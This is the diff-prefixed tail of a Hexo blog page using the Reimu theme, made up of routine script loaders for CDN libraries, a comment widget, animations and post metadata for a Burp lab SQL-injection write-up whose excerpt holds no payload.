+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "burp靶场漏洞实战",
+          url: "https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/",
+          excerpt: "",
+          description: "",
+          stripContent: " burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts 看",
+          date: "Tue Mar 31 2026 22:06:57 GMT+0800",
+          updated: "Fri Aug 14 2026 18:16:40 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
